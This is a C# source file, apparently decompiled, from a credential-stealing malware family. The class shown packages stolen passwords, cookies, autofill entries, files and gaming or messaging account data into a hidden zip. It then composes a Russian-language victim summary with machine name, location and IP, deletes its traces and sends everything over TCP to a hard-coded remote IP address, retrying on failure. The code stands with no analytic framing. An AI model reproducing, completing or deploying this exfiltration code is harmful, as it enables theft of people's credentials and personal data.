using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Ionic.Zip;
using Ionic.Zlib;

namespace Stealer;

internal class XlmdPNCfRyqKEs
{
	public static void DeleteDirectory(string target_dir)
	{
		try
		{
			string[] files = Directory.GetFiles(target_dir);
			string[] directories = Directory.GetDirectories(target_dir);
			string[] array = files;
			foreach (string path in array)
			{
				File.SetAttributes(path, FileAttributes.Normal);
				File.Delete(path);
			}
			array = directories;
			for (int i = 0; i < array.Length; i++)
			{
				DeleteDirectory(array[i]);
			}
			Directory.Delete(target_dir, recursive: false);
		}
		catch (Exception ex)
		{
			Handler.error(ex.ToString());
		}
	}

	[STAThread]
	public static void Start()
	{
		try
		{
			DateTime now = DateTime.Now;
			string text = $"{Path.GetTempPath()}{LhEWYGmwhOEoYt.tag}_{cDFkBrvXKxXwYB.Code()}{now.Year}_{now.Month}_{now.Day}_{now.Hour}{now.Minute}{now.Second}.zip";
			string name = $"{LhEWYGmwhOEoYt.tag}_{cDFkBrvXKxXwYB.Code()}{now.Year}_{now.Month}_{now.Day}_{now.Hour}{now.Minute}{now.Second}.zip";
			string text2 = ((tBBjEnntmoNlKq.count < 1000) ? "❤\ufe0f" : ((tBBjEnntmoNlKq.count < 2000) ? "\ud83d\udc9b" : "\ud83d\udc99"));
			string content = "⟨----------------------<" + text2 + ">----------------------⟩\n• \ud83d\udc64 | " + Environment.MachineName + "/" + Environment.UserName + "\n• \ud83c\udf0e | Расположение: " + cDFkBrvXKxXwYB.City() + " [" + cDFkBrvXKxXwYB.Country() + "]\n• \ud83c\udf10 | Айпи: " + cDFkBrvXKxXwYB.ip() + "\n⟨----------------------<" + text2 + "> ----------------------⟩" + $"\n• \ud83d\udd11 | Пароли: {HPCDmXNsRephme.count}" + $"\n• \ud83c\udf6a | Печенья: {tBBjEnntmoNlKq.count}" + $"\n• \ud83d\udd8a | Заполнений: {QLevflljZWQAqd.count}" + $"\n• \ud83d\udcc1 | Файлов: {FileGrabber.count}" + "\n⟨----------------------<" + text2 + "> ----------------------⟩\n• \ud83d\udcac | Discord: " + ((DiscordGrab.count > 0) ? "✅" : "❌") + "\n• \ud83d\udcac | Telegram: " + ((TGrab.count > 0) ? "✅" : "❌") + "\n• \ud83d\udcac | Steam: " + ((SteamGrab.count > 0) ? $"✅ ({SteamGrab.profiles})" : "❌") + "\n⟨----------------------<" + text2 + "> ----------------------⟩\n• ⛏ | Minecraft: " + ((MinecraftGrab.count > 0) ? $"✅ ({MinecraftGrab.accounts})" : "❌") + "\n• \ud83d\udc8e | BattleNet: " + ((BattleNet.count > 0) ? "✅" : "❌") + "\n• \ud83d\udc8e | EpicGames: " + (tBBjEnntmoNlKq.epicgames ? "✅" : (HPCDmXNsRephme.epicgames ? "✅" : "❌")) + "\n⟨----------------------<" + text2 + "> ----------------------⟩";
			using (ZipFile zipFile = new ZipFile(Encoding.GetEncoding("cp866")))
			{
				zipFile.CompressionLevel = CompressionLevel.BestCompression;
				zipFile.AddDirectory(Help.path_stealer);
				zipFile.Save(text);
				File.SetAttributes(text, FileAttributes.Hidden);
			}
			DeleteDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + LhEWYGmwhOEoYt.path);
			send(text, name, content);
			Environment.Exit(0);
		}
		catch (Exception ex)
		{
			Handler.error(ex.ToString());
		}
	}

	public static void send(string zipName, string name, string content)
	{
		try
		{
			if (LhEWYGmwhOEoYt.none && (HPCDmXNsRephme.count < 3 || QLevflljZWQAqd.count < 10) && tBBjEnntmoNlKq.count < 300)
			{
				File.Delete(zipName);
				Environment.Exit(0);
			}
			if (HPCDmXNsRephme.count == 0 && QLevflljZWQAqd.count == 0 && tBBjEnntmoNlKq.count < 0)
			{
				File.Delete(zipName);
				Environment.Exit(0);
			}
			string text = Convert.ToBase64String(File.ReadAllBytes(zipName));
			string s = "{\n   \"username\": \"" + LhEWYGmwhOEoYt.send_to + "\",\n   \"zipname\": \"" + name + "\",\n   \"content\": \"" + content + "\",\n   \"file\": \"" + text + "\"\n}";
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse("135.181.171.19"), 9055);
			Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			socket.Connect(remoteEP);
			socket.Send(bytes);
			socket.Shutdown(SocketShutdown.Both);
			socket.Close();
			File.Delete(zipName);
		}
		catch (Exception ex)
		{
			Handler.error(ex.ToString());
			Thread.Sleep(10000);
			send(zipName, name, content);
		}
	}

	public static string Base64Encode(string plainText)
	{
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
	}
}
